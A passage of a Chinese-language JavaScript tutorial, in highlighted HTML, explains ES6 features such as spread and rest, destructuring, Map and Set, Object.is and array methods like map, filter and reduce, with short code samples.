spellcheck="true">// ES6；</span><span class="token keyword">function</span> <span class="token function">printText</span><span class="token punctuation">(</span>text <span class="token operator">=</span> <span class="token string">'default'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 有多个参数时，带默认值的要放到最后</span></code></pre><ul><li><strong>扩展运算符(spread)和剩余运算符(rest)，即…的含义</strong></li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//扩展运算符(spread)   数组化为参数,功能是把数组或类数组对象展开成一系列用逗号隔开的值</span><span class="token comment" spellcheck="true">//1.构造数组</span><span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'aa'</span><span class="token punctuation">,</span><span class="token string">'bb'</span><span class="token punctuation">,</span><span class="token string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> arrs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>arr1<span class="token punctuation">,</span> <span class="token operator">...</span>arr2<span class="token punctuation">]</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arrs<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ['a','b','c','aa','bb','cc']</span><span class="token comment" spellcheck="true">//2.解析数组</span><span class="token keyword">var</span> son1<span class="token punctuation">,</span>son2<span class="token punctuation">;</span><span class="token punctuation">[</span>son1<span class="token punctuation">,</span> <span class="token operator">...</span>son2<span class="token punctuation">]</span> <span class="token operator">=</span> arr1console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>son1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 'a'</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>son2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//['b','c']</span><span class="token comment" spellcheck="true">//3.参数赋值</span><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">const</span> maxNum <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 返回5。max函数不接受数组只接受数列</span><span class="token comment" spellcheck="true">//剩余运算符(rest)     参数转化为数组,把逗号隔开的值序列组合成一个数组</span><span class="token comment" spellcheck="true">//1.所有参数可由一个变量统一接收</span><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">foo</span><span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [1, 2, 3, 4, 5]</span><span class="token function">foo</span><span class="token punctuation">(</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [a,b,c]</span></code></pre><ul><li><strong>对象和数组解构</strong></li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//1.对象</span><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>x<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> z<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">{</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">}</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// x = 1, y = 2, z = 3</span><span class="token comment" spellcheck="true">//还可赋值a,b,c</span><span class="token keyword">const</span> <span class="token punctuation">{</span>x<span class="token punctuation">:</span> a<span class="token punctuation">,</span> y<span class="token punctuation">:</span> b<span class="token punctuation">,</span> z<span class="token punctuation">:</span> c<span class="token punctuation">}</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// a = 1, b = 2, c = 3</span><span class="token comment" spellcheck="true">//2.数组</span><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token keyword">const</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 1, 2，按顺序自动获取</span><span class="token keyword">const</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token punctuation">,</span> c<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 1, 2, 5  获取指定位置</span><span class="token comment" spellcheck="true">//3.函数对象参数</span><span class="token keyword">const</span> student <span class="token operator">=</span> <span class="token punctuation">{</span>  name<span class="token punctuation">:</span> <span class="token string">'Job'</span><span class="token punctuation">,</span>  num<span class="token punctuation">:</span> <span class="token number">001</span><span class="token punctuation">,</span>  age<span class="token punctuation">:</span> <span class="token number">18</span><span class="token punctuation">,</span>  sex<span class="token punctuation">:</span> <span class="token string">'boy'</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> check <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">half</span><span class="token punctuation">(</span><span class="token punctuation">{</span>num<span class="token punctuation">,</span>sex<span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>num <span class="token punctuation">,</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 一个object</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// (001, 'boy')</span></code></pre><ul><li><strong>Map数据结构</strong></li></ul><p>为什么需要Map，因为Object本质上是键值对的集合，Object的键在使用Object.keys输出时都转化为了字符串，如果键为对象则都转化为[object, Object]，但是Map的键不限。</p><p>与Object的区别</p><p>（1）Map 中的键值是有序的，而添加到对象中的键则不是。因此，当对它进行遍历时，Map 对象是按插入的顺序返回键值。</p><p>（2）你可以通过 <code>size</code> 属性直接获取一个 <code>Map</code> 的键值对个数，而 <code>Object</code> 的键值对个数只能手动计算。</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//Map的结构遍历</span><span class="token comment" spellcheck="true">// 1. keys()-->将键名都取出来，组成一个可遍历的数据集合</span><span class="token keyword">let</span> m <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token string">'abc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'hahaha'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'baidu.com'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> x <span class="token keyword">of</span> m<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//m.keys => MapIterator {123, "a", false}  返回容器对象</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">></span><span class="token number">123</span> a <span class="token boolean">false</span><span class="token comment" spellcheck="true">//2. values()  返回键值的遍历器</span><span class="token keyword">let</span> m <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token string">'abc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'hahaha'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'baidu.com'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> x <span class="token keyword">of</span> m<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//m.values=>MapIterator {"abc", "hahaha", "baidu.com"}</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">--</span><span class="token operator">></span>abc hahaha baidu<span class="token punctuation">.</span>com<span class="token comment" spellcheck="true">//3. entries()  返回所有成员的遍历器</span><span class="token keyword">let</span> m <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token string">'abc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'hahaha'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'baidu.com'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//MapIterator {123 => "abc", "a" => "hahaha", false => "baidu.com"}</span><span class="token punctuation">[</span><span class="token operator">...</span>m<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">// [Array(2), Array(2), Array(2)]</span><span class="token comment" spellcheck="true">//4. 扩展运算符,转换为二维数组或一维数组</span><span class="token keyword">let</span> m <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span><span class="token string">'abc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'hahaha'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'baidu.com'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span>m<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//(3) [Array(2), Array(2), Array(2)]</span><span class="token punctuation">[</span><span class="token operator">...</span>m<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>       <span class="token comment" spellcheck="true">//[123, "a", false]</span></code></pre><ul><li><strong>数组的include方法</strong></li></ul><p>在ES5，Array已经提供了indexOf用来查找某个元素的位置，如果不存在就返回-1，</p><p>缺点：</p><ol><li><p>是它会返回-1和元素的位置来表示是否包含，在定位方面是没问题，就是不够语义化。</p></li><li><p>不能判断是否有NaN的元素。 </p></li></ol><p>ES6提供了Array.includes()函数判断是否包含某一元素，除了不能定位外，解决了indexOf的上述的两个问题。它直接返回true或者false表示是否包含元素，对NaN一样能有有效。 </p><pre class=" language-js"><code class="language-js"><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">// true</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">// false</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">NaN</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// true</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// false  该方法的第二个参数表示搜索的起始位置，默认为0</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// true</span></code></pre><h2 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 模板字符串前面可以添加标签</span><span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token string">'tom'</span><span class="token keyword">const</span> gender <span class="token operator">=</span> <span class="token boolean">true</span><span class="token keyword">function</span> myTagFunc <span class="token punctuation">(</span>strings<span class="token punctuation">,</span> name<span class="token punctuation">,</span> gender<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>strings<span class="token punctuation">,</span> name<span class="token punctuation">,</span> gender<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">const</span> result <span class="token operator">=</span> myTagFuc<span class="token template-string"><span class="token string">`hey, </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> is a </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>gender<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><h2 id="对象字面量的增强"><a href="#对象字面量的增强" class="headerlink" title="对象字面量的增强"></a>对象字面量的增强</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> bar <span class="token operator">=</span> <span class="token string">'345'</span><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    foo<span class="token punctuation">:</span> <span class="token number">123</span>    bar<span class="token punctuation">,</span>                 <span class="token comment" spellcheck="true">// bar: bar</span>    method1 <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// 省略了 :function</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>       <span class="token punctuation">}</span>    <span class="token punctuation">[</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token number">123</span> <span class="token comment" spellcheck="true">// 计算属性，加上方括号，可以为一个随机的值</span><span class="token punctuation">}</span></code></pre><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Object_initializer" target="_blank" rel="noopener">对象初始化</a></li></ul><h2 id="object-assign"><a href="#object-assign" class="headerlink" title="object.assign"></a>object.assign</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> source <span class="token operator">=</span> <span class="token punctuation">{</span>    a<span class="token punctuation">:</span> <span class="token number">123</span><span class="token punctuation">,</span>    b<span class="token punctuation">:</span> <span class="token number">123</span><span class="token punctuation">}</span><span class="token keyword">const</span> target <span class="token operator">=</span> <span class="token punctuation">{</span>    a<span class="token punctuation">:</span> <span class="token number">456</span><span class="token punctuation">,</span>    c<span class="token punctuation">:</span> <span class="token number">456</span><span class="token punctuation">}</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span>source<span class="token punctuation">)</span></code></pre><h2 id="object-is"><a href="#object-is" class="headerlink" title="object.is"></a>object.is</h2><pre class=" language-js"><code class="language-js"><span class="token operator">+</span><span class="token number">0</span> <span class="token operator">===</span> <span class="token operator">-</span><span class="token number">0</span> <span class="token comment" spellcheck="true">// true</span><span class="token number">NaN</span> <span class="token operator">===</span> <span class="token number">NaN</span> <span class="token comment" spellcheck="true">// false</span>object<span class="token punctuation">.</span><span class="token function">is</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//false</span>Object<span class="token punctuation">.</span><span class="token function">is</span><span class="token punctuation">(</span><span class="token number">NaN</span><span class="token punctuation">,</span> <span class="token number">NaN</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// true</span></code></pre><p><code>Object.is()</code> 方法判断两个值是否为<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Equality_comparisons_and_sameness" target="_blank" rel="noopener">同一个值</a>。如果满足以下条件则两个值相等:</p><ul><li>都是 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/undefined" target="_blank" rel="noopener"><code>undefined</code></a></li><li>都是 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/null" target="_blank" rel="noopener"><code>null</code></a></li><li>都是 <code>true</code> 或 <code>false</code></li><li>都是相同长度的字符串且相同字符按相同顺序排列</li><li>都是相同对象（意味着每个对象有同一个引用）</li><li>都是数字且<ul><li>都是 <code>+0</code></li><li>都是 <code>-0</code></li><li>都是 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/NaN" target="_blank" rel="noopener"><code>NaN</code></a></li><li>或都是非零而且非 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/NaN" target="_blank" rel="noopener"><code>NaN</code></a> 且为同一个值</li></ul></li></ul><p>与<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Comparison_Operators#Equality" target="_blank" rel="noopener"><code>==</code></a> 运算<em>不同。</em> <code>==</code> 运算符在判断相等前对两边的变量(如果它们不是同一类型) 进行强制转换 (这种行为的结果会将 <code>&quot;&quot; == false</code> 判断为 <code>true</code>), 而 <code>Object.is</code>不会强制转换两边的值。</p><p>与<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Comparison_Operators#Identity" target="_blank" rel="noopener"><code>===</code></a> 运算也不相同。 <code>===</code> 运算符 (也包括 <code>==</code> 运算符) 将数字 <code>-0</code> 和 <code>+0</code> 视为相等 ，而将<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Number/NaN" target="_blank" rel="noopener"><code>Number.NaN</code></a> 与<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/NaN" target="_blank" rel="noopener"><code>NaN</code></a>视为不相等.</p><h2 id="Set数据结构"><a href="#Set数据结构" class="headerlink" title="Set数据结构"></a>Set数据结构</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>size<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token keyword">delete</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token punctuation">[</span><span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token string">'symbol value'</span><span class="token punctuation">,</span>    foo<span class="token punctuation">:</span> <span class="token string">'value'</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 用for in, Object.keys, JSON.stringify都获取不到</span></code></pre><h2 id="forEach、find、map、filter、reduce、every、some"><a href="#forEach、find、map、filter、reduce、every、some" class="headerlink" title="forEach、find、map、filter、reduce、every、some"></a>forEach、find、map、filter、reduce、every、some</h2><h4 id="1、forEach-没有返回值，只是让数组中的每个元素执行function的操作"><a href="#1、forEach-没有返回值，只是让数组中的每个元素执行function的操作" class="headerlink" title="1、forEach 没有返回值，只是让数组中的每个元素执行function的操作"></a>1、forEach 没有返回值，只是让数组中的每个元素执行function的操作</h4><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>item <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//2,4,6,8,10</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="2、find-返回数组中第一个满足条件的元素（查找）"><a href="#2、find-返回数组中第一个满足条件的元素（查找）" class="headerlink" title="2、find 返回数组中第一个满足条件的元素（查找）"></a>2、find 返回数组中第一个满足条件的元素（查找）</h4><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    <span class="token keyword">return</span> item <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//4</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="3、map-返回一个新数组，数组中的每个元素为调用function的结果"><a href="#3、map-返回一个新数组，数组中的每个元素为调用function的结果" class="headerlink" title="3、map 返回一个新数组，数组中的每个元素为调用function的结果"></a>3、map 返回一个新数组，数组中的每个元素为调用function的结果</h4><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    <span class="token keyword">return</span> item <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//[2,4,6,8,10]</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="4、filter-返回一个符合function条件的元素数组（过滤）"><a href="#4、filter-返回一个符合function条件的元素数组（过滤）" class="headerlink" title="4、filter 返回一个符合function条件的元素数组（过滤）"></a>4、filter 返回一个符合function条件的元素数组（过滤）</h4><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    <span class="token keyword">return</span> item <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//[4,5]</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h4 id="5、reduce-让数组中的前项和后项做某种运算，返回累计的最终值"><a href="#5、reduce-让数组中的前项和后项做某种运算，返回累计的最终值" class="headerlink" title="5、reduce 让数组中的前项和后项做某种运算，返回累计的最终值"></a>5、reduce 让数组中的前项和后项做某种运算，返回累计的最终值</h4><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span>prev<span class="token 